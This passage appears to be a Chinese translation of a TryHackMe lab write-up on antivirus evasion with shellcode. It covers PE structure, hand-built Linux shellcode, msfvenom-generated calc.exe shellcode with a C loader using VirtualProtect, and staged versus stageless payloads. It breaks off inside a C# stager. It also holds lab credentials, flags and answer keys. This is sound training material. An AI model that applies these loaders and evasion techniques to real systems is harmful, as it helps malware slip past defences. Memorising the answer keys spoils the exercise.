---
sidebar_position: 4
---

# AV 规避：Shellcode

## 任务1 简介

在本房间中，我们将探讨如何构建和交付有效载荷，重点在于避免被常见 AV 引擎检测到。 我们将研究作为攻击者可用的不同技术，并讨论每种技术的优缺点。

### 目标

- 了解 shellcode 是如何制作的。
- 探索分阶段有效载荷的优缺点。
- 创建隐蔽的 shellcode 以避免 AV 检测。

### 先决条件

建议事先了解一些[防病毒软件的工作原理](https://tryhackme.com/room/introtoav)知识，并对加密和编码有基本理解。 虽然不是严格要求，但了解一些基本汇编语言也会有所帮助。 此外，我们建议对阅读代码和理解函数（C、C#）有基本了解。

:::info 回答以下问题

<details>

<summary> 点击并继续学习！ </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务 2 挑战

在此挑战中，我们准备了一台 Windows 机器，带有一个 Web 应用程序，供您上传有效载荷。 一旦上传，有效载荷将由 AV 检查，如果发现没有恶意软件，则会被执行。 此挑战的主要目标是规避 VM 上安装的防病毒软件，并捕获文件系统中的标志。 请随意尝试本房间讨论的所有技术，将它们上传到 `http://MACHINE_IP/`。

需记住的要点：

- 尝试结合本房间讨论的技术。
- 该网站仅支持 EXE 文件。
- 一旦 AV 扫描上传的文件且未检测到恶意代码，文件就会被执行。 因此，如果一切正确组合，您应该会收到一个反向 shell。

![AV Challenge Web App](img/image_20251141-214152.png)

您现在可以忽略此任务的问题，但请务必在成功绕过 AV 并获得 shell 后返回回答它们。

部署附加的 VM 以跟进房间内容，然后再继续下一部分！ VM 将在浏览器中部署，并应自动出现在分屏视图中。 如果 VM 不可见，请使用页面右上角的蓝色显示分屏视图按钮。 如果您更喜欢通过 RDP 连接，可以使用以下凭据：

| Key |    Value    |
| :-: | :---------: |
| 用户名 |     thm     |
|  密码 | Password321 |

您还需要 AttackBox 来完成某些任务，因此这也是启动它的好时机。

:::info 回答以下问题

<details>

<summary> VM 上运行的是哪种防病毒软件？ </summary>

```plaintext
Windows Defender
```

</details>

<details>

<summary> 您可以访问的用户帐户名称是什么？ </summary>

```plaintext
av-victim
```

</details>

<details>

<summary> 在受害机器上建立一个可用的 shell 并读取用户桌面上的文件。 标志是什么？ </summary>

```plaintext
THM{H3ll0-W1nD0ws-Def3nd3r!}
```

</details>

:::

## 任务 3 PE 结构

本任务重点介绍 Windows 二进制文件 PE 数据结构的一些高级基本元素。

### 什么是 PE？

Windows 可执行文件格式，又称 PE（可移植可执行文件），是一种包含文件必要信息的数据结构。 它是一种在磁盘上组织可执行文件代码的方式。 Windows 操作系统组件，如 Windows 和 DOS 加载器，可以将其加载到内存中，并根据在 PE 中找到的解析文件信息执行它。

通常，Windows 二进制文件（如 EXE、DLL 和对象代码文件）的默认文件结构具有相同的 PE 结构，并在 Windows 操作系统中适用于（x86 和 x64）CPU 架构。

PE 结构包含各种部分，这些部分保存有关二进制文件的信息，例如元数据和外部库内存地址的链接。 其中一个部分是 **PE 头**，它包含元数据信息、指针以及内存中地址部分的链接。 另一个部分是 **数据部分**，它包括包含 Windows 加载器运行程序所需信息的容器，例如可执行代码、资源、库链接、数据变量等。

![PE Structure](img/image_20251145-214539.png)

PE 结构中有不同类型的数据容器，每个容器保存不同的数据。

1. **.text** 存储程序的实际代码
2. **.data** 保存已初始化和定义的变量
3. **.bss** 保存未初始化的数据（已声明但未赋值的变量）
4. **.rdata** 包含只读数据
5. **.edata** 包含可导出对象及相关表信息
6. **.idata** 导入的对象及相关表信息
7. **.reloc** 映像重定位信息
8. **.rsrc** 链接程序使用的外部资源，如图像、图标、嵌入式二进制文件和清单文件，其中包含有关程序版本、作者、公司和版权的所有信息！

PE 结构是一个广泛而复杂的主题，我们不会过多涉及头和数据部分的细节。 本任务提供了 PE 结构的高级概述。 如果您有兴趣获取有关该主题的更多信息，我们建议查看以下 THM 房间，其中更详细地解释了该主题：

- [Windows Internals](https://tryhackme.com/room/windowsinternals)
- 剖析 PE 头

如果您查看 [Windows PE 格式](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)的文档网站，也可以获得更深入的 PE 细节。

查看 PE 内容时，我们会看到它包含一堆人类不可读的字节。 但是，它包含了加载器运行文件所需的所有细节。 以下是 Windows 加载器读取可执行二进制文件并将其作为进程运行的示例步骤。

1. 头部分：解析 DOS、Windows 和可选头以提供有关 EXE 文件的信息。 例如，
   - 幻数以 "MZ" 开头，这告诉加载器这是一个 EXE 文件。
   - 文件签名
   - 文件是为 x86 还是 x64 CPU 架构编译的。
   - 创建时间戳。
2. 解析节表细节，例如
   - 文件包含的节数。
3. 基于入口点地址和映像基址的偏移量将文件内容映射到内存中。
   - 入口点地址和映像基址的偏移量。
   - RVA：相对虚拟地址，与映像基址相关的地址。
4. 导入项、DLL和其他对象被加载到内存中。
5. 定位入口点地址并运行主执行函数。

### 为什么我们需要了解PE？

我们需要学习它有几个原因。 首先，由于我们处理的是打包和解包主题，该技术需要有关PE结构的详细信息。

另一个原因是AV软件和恶意软件分析师根据PE头和其他PE部分中的信息分析EXE文件。 因此，要创建或修改具有针对Windows机器的AV规避能力的恶意软件，我们需要了解Windows可移植可执行文件的结构以及恶意shellcode可以存储的位置。

我们可以通过如何定义和初始化shellcode变量来控制将shellcode存储在哪个数据部分。 以下是一些示例，展示我们如何在PE中存储shellcode：

- 将shellcode定义为主函数内的局部变量将将其存储在\*\* .TEXT \*\* PE部分中。
- 将shellcode定义为全局变量将将其存储在\*\* .Data \*\*部分中。
- 另一种技术涉及将shellcode作为原始二进制存储在图标图像中，并在代码中链接它，因此在这种情况下，它会出现在\*\* .rsrc \*\*数据部分中。
- 我们可以添加自定义数据部分来存储shellcode。

### PE-Bear

附加的VM是一个Windows开发机器，具有解析EXE文件和读取我们讨论的详细信息所需的工具。 为方便起见，我们在桌面上提供了PE-Bear软件的副本，它有助于检查PE结构：头、部分等。 PE-Bear提供了一个图形用户界面来显示所有相关的EXE详细信息。 要加载EXE文件进行分析，请选择**File** -> **Load PEs** (Ctrl + O)。

![PE-Bear: 主窗口](img/image_20251149-214931.png)

一旦文件被加载，我们可以看到所有PE详细信息。 以下屏幕截图显示了加载文件的PE详细信息，包括我们在本任务前面讨论的头和部分。

![PE-Bear: 加载文件](img/image_20251149-214947.png)

现在是时候尝试一下了！ 加载**thm-intro2PE.exe**文件以回答以下问题。 该文件位于以下位置：`c:\Tools\PE files\thm-intro2PE.exe`。

:::info 回答以下问题

<details>

<summary> thm-intro2PE.exe文件的MD5哈希值的最后6位是什么？ </summary>

```plaintext
530949
```

</details>

<details>

<summary> thm-intro2PE.exe文件的幻数值是多少（十六进制）？ </summary>

```plaintext
5A4D
```

</details>

<details>

<summary> thm-intro2PE.exe文件的入口点值是多少？ </summary>

```plaintext
12E4
```

</details>

<details>

<summary> thm-intro2PE.exe文件有多少个部分？ </summary>

```plaintext
7
```

</details>

<details>

<summary> 可以使用自定义部分来存储额外数据。 恶意软件开发者使用这种技术创建一个包含其恶意代码的新部分，并劫持程序的流程以跳转并执行新部分的内容。 额外部分的名称是什么？ </summary>

```plaintext
.flag
```

</details>

<details>

<summary> 检查额外部分的内容。 标志是什么？ </summary>

```plaintext
THM{PE-N3w-s3ction!}
```

</details>

:::

## 任务4 Shellcode简介

Shellcode是一组精心设计的机器代码指令，告诉易受攻击的程序运行附加功能，并且在大多数情况下，提供对系统shell的访问或创建反向命令shell。

一旦shellcode被注入到进程中并由易受攻击的软件或程序执行，它会修改代码运行流程以更新程序的寄存器和功能来执行攻击者的代码。

它通常用汇编语言编写，并翻译成十六进制操作码。 编写独特和自定义的shellcode有助于显著规避AV软件。 但编写自定义shellcode需要处理汇编语言的优秀知识和技能，这不是一项容易的任务！

### 一个简单的Shellcode

为了制作你自己的shellcode，需要一套技能：

- 对x86和x64 CPU架构的适当理解。
- 汇编语言。
- 对编程语言（如C）的扎实知识。
- 熟悉Linux和Windows操作系统。

为了生成我们自己的shellcode，我们需要从汇编器机器代码中编写和提取字节。 对于这个任务，我们将使用AttackBox为Linux创建一个简单的shellcode，写入字符串"THM, Rocks!"。 以下汇编代码使用两个主要函数：

- 系统写入函数（sys_write）来打印我们选择的字符串。
- 系统退出函数（sys_exit）来终止程序的执行。

为了调用这些函数，我们将使用**系统调用**。 系统调用是程序请求内核执行某些操作的方式。 在这种情况下，我们将请求内核将字符串写入我们的屏幕，然后退出程序。 每个操作系统关于系统调用都有不同的调用约定，这意味着要在Linux中使用写入，您可能使用与在Windows上使用的不同的系统调用。 对于64位Linux，您可以通过设置以下值从内核调用所需的函数：

| rax  | System Call                    | rdi                                 | rsi              | rdx                               |
| :--- | :----------------------------- | :---------------------------------- | :--------------- | :-------------------------------- |
| 0x1  | sys_write | unsigned int fd                     | const char \*buf | size_t count |
| 0x3c | sys_exit  | int error_code |                  |                                   |

上表告诉我们需要在不同的处理器寄存器中设置哪些值，以使用系统调用调用sys_write和sys_exit函数。 对于64位Linux，rax寄存器用于指示我们希望在内核中调用的函数。 将rax设置为0x1使内核执行sys_write，将rax设置为0x3c将使内核执行sys_exit。 这两个函数中的每一个都需要一些参数才能工作，这些参数可以通过rdi、rsi和rdx寄存器设置。 您可以在此处找到可用的64位Linux系统调用的完整参考。

对于**sys_write**，通过**rdi**发送的第一个参数是要写入的文件描述符。 **rsi**中的第二个参数是指向我们想要打印的字符串的指针，而**rdx**中的第三个参数是要打印的字符串的大小。

对于**sys_exit**，需要将rdi设置为程序的退出代码。 我们将使用代码0，这意味着程序成功退出。

将以下代码复制到您的AttackBox中，保存为名为**thm.asm**的文件：

```asm
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "THM, Rocks!\r\n"
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "THM, Rocks!\r\n", is pushed into the stack.
    db "THM, Rocks!", 0dh, 0ah
```

让我们再解释一下ASM代码。 首先，我们的消息字符串存储在.text节的末尾。 由于我们需要一个指向该消息的指针来打印它，我们将在消息本身之前跳转到call指令。 当执行**call GOBACK**时，call之后的下一条指令的地址将被压入堆栈，这对应于我们消息的位置。 请注意，消息末尾的0dh、0ah是换行符（\r\n）的二进制等效形式。

接下来，程序启动GOBACK例程，并为我们的第一个sys_write()函数准备所需的寄存器。

- 我们通过在rax寄存器中存储1来指定sys_write函数。
- 我们将rdi设置为1，以便将字符串打印到用户控制台（STDOUT）。
- 我们弹出一个指向我们字符串的指针，该指针在我们调用GOBACK时被压入，并将其存储到rsi中。
- 通过syscall指令，我们使用我们准备的值执行sys_write函数。
- 对于下一部分，我们执行相同的操作来调用sys_exit函数，因此我们将0x3c设置到rax寄存器中，并调用syscall函数来退出程序。

接下来，我们编译并链接ASM代码以创建x64 Linux可执行文件，并最终执行该程序。

```shell title="Assembler and link our code"
user@AttackBox$ nasm -f elf64 thm.asm
user@AttackBox$ ld thm.o -o thm
user@AttackBox$ ./thm
THM,Rocks!
```

我们使用**nasm**命令编译asm文件，指定\*\*-f elf64\*\*选项以指示我们正在为64位Linux编译。 请注意，结果我们获得了一个.o文件，其中包含目标代码，需要链接才能成为可工作的可执行文件。 **ld**命令用于链接目标文件并获取最终的可执行文件。 **-o**选项用于指定输出可执行文件的名称。

现在我们有了编译后的ASM程序，让我们使用**objdump**命令通过转储编译后二进制文件的.text节来提取shellcode。

```shell title="Dump the .text section"
user@AttackBox$ objdump -d thm

thm:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:    eb 1e                    jmp    4000a0 

0000000000400082 :
  400082:    b8 01 00 00 00           mov    $0x1,%eax
  400087:    bf 01 00 00 00           mov    $0x1,%edi
  40008c:    5e                       pop    %rsi
  40008d:    ba 0d 00 00 00           mov    $0xd,%edx
  400092:    0f 05                    syscall 
  400094:    b8 3c 00 00 00           mov    $0x3c,%eax
  400099:    bf 00 00 00 00           mov    $0x0,%edi
  40009e:    0f 05                    syscall 

00000000004000a0 :
  4000a0:    e8 dd ff ff ff           callq  400082 
  4000a5:    54                       push   %rsp
  4000a6:    48                       rex.W
  4000a7:    4d 2c 20                 rex.WRB sub $0x20,%al
  4000aa:    52                       push   %rdx
  4000ab:    6f                       outsl  %ds:(%rsi),(%dx)
  4000ac:    63 6b 73                 movslq 0x73(%rbx),%ebp
  4000af:    21                       .byte 0x21
  4000b0:    0d                       .byte 0xd
  4000b1:    0a                       .byte 0xa
```

现在我们需要从上述输出中提取十六进制值。 为此，我们可以使用**objcopy**将\*\*.text**节转储到一个名为**thm.text\*\*的新文件中，格式为二进制，如下所示：

```shell
user@AttackBox$ objcopy -j .text -O binary thm thm.text
```

thm.text包含我们的shellcode，格式为二进制，因此为了能够使用它，我们需要先将其转换为十六进制。 **xxd**命令具有\*\*-i\*\*选项，可以直接以C字符串形式输出二进制文件：

```shell title="Output the hex equivalent to our shellcode"
user@AttackBox$ xxd -i thm.text
unsigned char new_text[] = {
  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
  0x0d, 0x0a
};
unsigned int new_text_len = 50;
```

最后，我们得到了它，一个来自我们ASM汇编的格式化shellcode。 这很有趣！ 正如我们所看到的，为你的工作生成shellcode需要奉献精神和技能！

为了确认提取的shellcode按我们预期的方式工作，我们可以执行我们的shellcode并将其注入到C程序中。

```c
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
        0x0d, 0x0a
    };
    
    (*(void(*)())message)();
    return 0;
}
```

然后，我们按如下方式编译并执行它，

```shell title="Compiler our C program"
user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx
user@AttackBox$ ./thmx
THM,Rocks!
```

很好！ 它起作用了。 请注意，我们通过禁用NX保护来编译C程序，这可能会阻止我们在数据段或堆栈中正确执行代码。

理解shellcode及其创建方式对于以下任务至关重要，尤其是在处理shellcode的加密和编码时。

:::info 回答以下问题

<details>

<summary> 修改您的C程序以执行以下shellcode。 标志是什么？ </summary>

```c
unsigned char message[] = {
  0xeb, 0x34, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x89, 0xf0, 0x80,
  0x34, 0x08, 0x01, 0x48, 0x83, 0xc1, 0x01, 0x48, 0x83, 0xf9, 0x19, 0x75,
  0xf2, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xba,
  0x19, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf,
  0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x55,
  0x49, 0x4c, 0x7a, 0x78, 0x31, 0x74, 0x73, 0x2c, 0x30, 0x72, 0x36, 0x2c,
  0x34, 0x69, 0x32, 0x30, 0x30, 0x62, 0x31, 0x65, 0x32, 0x7c, 0x0d, 0x0a
};
```

```plaintext
THM{y0ur-1s7-5h311c0d3}
```

</details>

:::

## 任务5 生成Shellcode

在本任务中，我们继续使用shellcode，并演示如何使用公共工具（如Metasploit框架）生成和执行shellcode。

### 使用公共工具生成Shellcode

Shellcode可以针对特定格式和特定编程语言生成。 这取决于您。 例如，如果您的投放器（即主要的exe文件）包含将发送给受害者的shellcode，并且是用C编写的，那么我们需要生成一个在C中可用的shellcode格式。

通过公共工具生成shellcode的优点是，我们不需要从头开始制作自定义shellcode，甚至不需要成为汇编语言专家。 大多数公共C2框架都提供自己的shellcode生成器，与C2平台兼容。 当然，这对我们来说非常方便，但缺点是大多数（或者我们可以说所有）生成的shellcode都被AV供应商熟知，并且可以轻松检测到。

我们将在AttackBox上使用Msfvenom生成一个执行Windows文件的shellcode。 我们将创建一个运行`calc.exe`应用程序的shellcode。

```shell title="Generate Shellcode to Execute calc.exe"
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
No encoder specified, outputting raw payload
Payload size: 193 bytes
Final size of c file: 835 bytes
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

结果，Metasploit框架生成了一个执行Windows计算器（calc.exe）的shellcode。 Windows计算器在恶意软件开发过程中被广泛用作示例，以展示概念验证。 如果该技术有效，则会弹出一个新的Windows计算器实例。 这确认了任何可执行的shellcode都可以与所使用的方法一起工作。

### Shellcode注入

黑客使用各种技术将shellcode注入到正在运行的或新的线程和进程中。 Shellcode注入技术修改程序的执行流程，以更新程序的寄存器和函数，从而执行攻击者自己的代码。

现在让我们继续使用生成的shellcode并在操作系统上执行它。 以下是一个包含我们生成的shellcode的C代码，该shellcode将被注入到内存中并执行"calc.exe"。

在AttackBox上，让我们将以下内容保存到名为`calc.c`的文件中：

```c
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}
```

现在让我们将其编译为exe文件：

```shell title="Compile our C program for Windows"
user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

一旦我们有了exe文件，让我们将其传输到Windows机器并执行它。 要传输文件，您可以使用AttackBox上的smbclient访问`\\MACHINE_IP\Tools`处的SMB共享，使用以下命令（记住`thm`用户的密码是`Password321`）：

```shell title="Copy calc-MSC.exe to Windows Machine"
user@AttackBox$ smbclient -U thm '//10.82.134.191/Tools'
smb: \> put calc-MSF.exe
```

这应该会在Windows机器的`C:\Tools\`中复制您的文件。

虽然您的机器的AV应该被禁用，但请随意尝试将您的有效负载上传到THM Antivirus Check，地址为`http://MACHINE_IP/`。

![执行MSF有效负载以运行calc.exe](img/image_20251136-223631.png)

Metasploit框架有许多其他shellcode格式和类型，可满足您的所有需求。 我们强烈建议您更多地试验它，并通过生成不同的shellcode来扩展您的知识。

前面的示例展示了如何生成shellcode并在目标机器中执行它。 当然，您可以复制相同的步骤来创建不同类型的shellcode，例如Meterpreter shellcode。

### 从EXE文件生成Shellcode

Shellcode也可以存储在`.bin`文件中，这是一种原始数据格式。 在这种情况下，我们可以使用`xxd -i`命令获取其shellcode。

C2框架将shellcode作为原始二进制文件`.bin`提供。 如果是这种情况，我们可以使用Linux系统命令`xxd`来获取二进制文件的十六进制表示。 为此，我们执行以下命令：`xxd -i`。

让我们使用msfvenom创建一个原始二进制文件来获取shellcode：

```shell title="Generate a Raw shellcode to Execute calc.exe"
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
No encoder specified, outputting raw payload
Payload size: 193 bytes

user@AttackBox$ file /tmp/example.bin
/tmp/example.bin: data
```

并在创建的文件上运行`xxd`命令：

```shell title="Get the shellcode using the xxd command"
user@AttackBox$ xxd -i /tmp/example.bin
unsigned char _tmp_example_bin[] = {
  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,
  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,
  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,
  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,
  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,
  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,
  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,
  0x00
};
unsigned int _tmp_example_bin_len = 193;
```

如果我们将输出与之前使用Metasploit创建的shellcode进行比较，它们是匹配的。

:::info 回答以下问题

<details>

<summary> 应用我们在本任务中讨论的内容，为下一个主题做好准备！ </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务 6 分阶段载荷

在我们的目标中绕过 AV，我们将找到两种主要方法来向受害者交付最终的 shellcode。 根据方法的不同，您会发现载荷通常被分类为**分阶段**或**无阶段**载荷。 在本任务中，我们将探讨两种方法的差异以及每种方法的优势。

### 无阶段载荷

无阶段载荷将最终的 shellcode 直接嵌入到自身中。 将其视为一个打包的应用程序，以单步过程执行 shellcode。 在之前的任务中，我们嵌入了一个可执行文件，该文件嵌入了一个简单的 `calc` shellcode，从而创建了一个无阶段载荷。

<!-- ![Stageless Payload](img/image_20251141-104108.png) -->

![无阶段载荷](img/image_20251149-204902.png)

在上面的示例中，当用户执行恶意载荷时，嵌入的 shellcode 将运行，为攻击者提供反向 shell。

### 分阶段载荷

分阶段载荷通过使用中间 shellcode 来工作，这些中间 shellcode 作为执行最终 shellcode 的步骤。 这些中间 shellcode 中的每一个被称为**阶段器**，其主要目标是提供一种方法来检索最终的 shellcode 并最终执行它。

虽然可能存在具有多个阶段的载荷，但通常情况涉及一个两阶段载荷，其中第一阶段，我们称之为**阶段0**，是一个存根 shellcode，它将连接回攻击者的机器以下载要执行的最终 shellcode。

<!-- ![Staged Payload - stage0](img/image_20251141-104147.png) -->

![分阶段载荷 - 阶段0](img/image_20251149-204920.png)

一旦检索到，阶段0存根将在载荷进程的内存中的某个位置注入最终的 shellcode 并执行它（如下所示）。

<!-- ![Staged Payload - Send ReveseShell](img/image_20251142-104203.png) -->

![分阶段载荷 - 发送反向 Shell](img/image_20251149-204935.png)

### 分阶段 vs. 无阶段

在决定使用哪种类型的载荷时，我们必须了解我们将攻击的环境。 每种载荷类型根据具体的攻击场景都有其优势和劣势。

对于无阶段载荷，您将发现以下优势：

- 生成的可执行文件打包了使我们的 shellcode 工作所需的所有内容。
- 载荷将在不需要额外网络连接的情况下执行。 网络交互越少，被 IPS 检测到的机会就越小。
- 如果您正在攻击一个网络连接非常受限的主机，您可能希望整个载荷都在一个包中。

对于分阶段载荷，您将拥有：

- 磁盘上的占用空间小。 由于阶段0仅负责下载最终的 shellcode，它很可能体积较小。
- 最终的 shellcode 没有嵌入到可执行文件中。 如果您的载荷被捕获，蓝队将只能访问阶段0存根，而无法获得更多信息。
- 最终的 shellcode 被加载到内存中，从不接触磁盘。 这使得它不太容易被 AV 解决方案检测到。
- 您可以对许多 shellcode 重复使用相同的阶段0投放器，因为您可以简单地替换提供给受害者机器的最终 shellcode。

总之，除非我们为其添加一些上下文，否则我们不能说哪种类型比另一种更好。 一般来说，无阶段载荷更适合具有大量边界安全的网络，因为它不依赖于必须从互联网下载最终的 shellcode。 例如，如果您正在执行 USB 投放攻击以针对封闭网络环境中的计算机，并且您知道无法与您的机器建立连接，那么无阶段是首选。

另一方面，当您希望本地机器上的占用空间减少到最小时，分阶段载荷非常有用。 由于它们在内存中执行最终载荷，一些 AV 解决方案可能更难检测到它们。 它们也非常适合避免暴露您的 shellcode（这些 shellcode 通常需要相当长的时间来准备），因为 shellcode 在任何时候都不会被投放到受害者的磁盘上（作为工件）。

### Metasploit 中的阶段器

在使用 msfvenom 创建载荷或在 Metasploit 中直接使用它们时，您可以选择使用分阶段或无阶段载荷。 例如，如果您想生成一个反向 TCP shell，您会发现有两个载荷用于此目的，名称略有不同（注意 `shell` 后的 `_` 与 `/`）：

| 载荷                                                                      | 类型    |
| :---------------------------------------------------------------------- | :---- |
| windows/x64/shell_reverse_tcp | 无阶段载荷 |
| windows/x64/shell/reverse_tcp                      | 分阶段载荷 |

您通常会发现相同的命名模式应用于其他类型的 shell。 例如，要使用无阶段 Meterpreter，我们会使用 `windows/x64/meterpreter_reverse_tcp`，而不是 `windows/x64/meterpreter/reverse_tcp`，后者是其分阶段对应物。

### 创建您自己的阶段器

要创建分阶段载荷，我们将使用由 [@mvelazc0](https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs) 提供的阶段器代码的略微修改版本。 我们阶段器的完整代码可以在此处获取，但也可以在您的 Windows 机器上的 `C:\Tools\CS Files\StagedPayload.cs` 中找到：

<details>

<summary> 完整载荷代码（点击阅读） </summary>

```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
  [DllImport("kernel32")]
